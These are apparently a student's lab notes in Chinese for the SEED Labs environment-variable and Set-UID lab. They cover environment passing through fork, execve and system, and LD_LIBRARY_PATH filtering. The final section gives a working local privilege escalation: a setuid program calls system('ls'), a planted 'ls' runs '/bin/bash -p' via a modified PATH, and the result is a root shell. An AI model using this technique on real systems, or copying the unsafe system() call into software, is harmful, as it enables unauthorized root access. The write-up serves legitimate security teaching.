# SEED Labs  - Enviroment Variable and *Set-UID* Program Lab

## 1 Overview 

## 2 Lab Tasks

#### 2.1 Task1 Manipulating Enviroment Variables

+ 使用`printenv`或`env`访问环境变量

```sh
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ printenv PWD
/home/yuan/learningNotes/Lab/Cap2_env/lab
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ env | grep PWD
OLDPWD=/home/yuan
PWD=/home/yuan/learningNotes/Lab/Cap2_env/lab
```
+ 使用`export`和`unset`来添加或删除一个环境变量

#### 2.2 Task2 向子进程传递环境变量

编译并运行task2.c 第一次编译时将Line22注释掉，输出子进程的所有环境变量； 第二次编译时将Line19注释掉，输出父进程的环境变量。

用`diff`对比二者

```sh
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ gcc -o a.out task2.c 
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ ./a.out > child 
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ gcc -o a.out task2.c 
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ ./a.out > another 
yuan@ubuntu:~/learningNotes/Lab/Cap2_env/lab$ diff -s child another 
檔案 child 和 another 相同
```

发现二者没有差别。

	结论：使用fork()函数，父进程将所有环境变量传递给了子进程


### 2.3/4 Task3 用execve() system() 向子进程传递环境变量

编译并运行execve_env.c程序，向execve传递的第三个参数是NULL时，什麼都不显示

注释掉14行并取消注释15行，编译运行，此时传递的第三个参数是environ，程序会打印所有环境变量



编译并运行system_env.c程序打印所有环境变量


### 2.5 环境变量与Set-UID程序

编译task5.c


```sh
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ gcc -o foo.out task5.c 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ sudo chown root foo.out 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ sudo chmod 4755 foo.out 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ export LD_LIBRARY_PATH=.
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ export ANY_NAME="anynameiwant"
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ env | grep LD_ 
LD_LIBRARY_PATH=.
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ env | grep ANY_
ANY_NAME=anynameiwant
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ ./foo.out | grep ANY_
ANY_NAME=anynameiwant
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ ./foo.out | grep LD_
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$
```
可以看到Set-UID程序对部分环境变量的保护


### 2.6 PATH环境变量和Set-UID程序

*利用system()函数没有使用完整路径的漏洞，结合PATH环境变量轻松取得超级用户权限*

	实验开始时，用以下指令绕过bash的保护措施

`$ sudo ln -sf /bin/zsh /bin/sh`


task6.c代码：

```c
int main(int argc, char const *argv[])
{
	system("ls");
	return 0;
}
```


用来攻击task6的程序:
```c
int main(int argc, char const *argv[])
{
	system("/bin/bash -p");
	return 0;
}
```

攻击过程：
```sh
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ gcc -o vul_ls.out task6.c 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ sudo chown root vul_ls.out 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ sudo chmod 4755 vul_ls.out 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ gcc -o ls attack_task6.c 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ export PATH=.:$PATH 
yuan@ubuntu:~/learningNotes/Computer_Security/Cap2_env/lab$ ./vul_ls.out 
bash-4.4# id
uid=1000(yuan) gid=1000(yuan) euid=0(root) 组=1000(yuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```





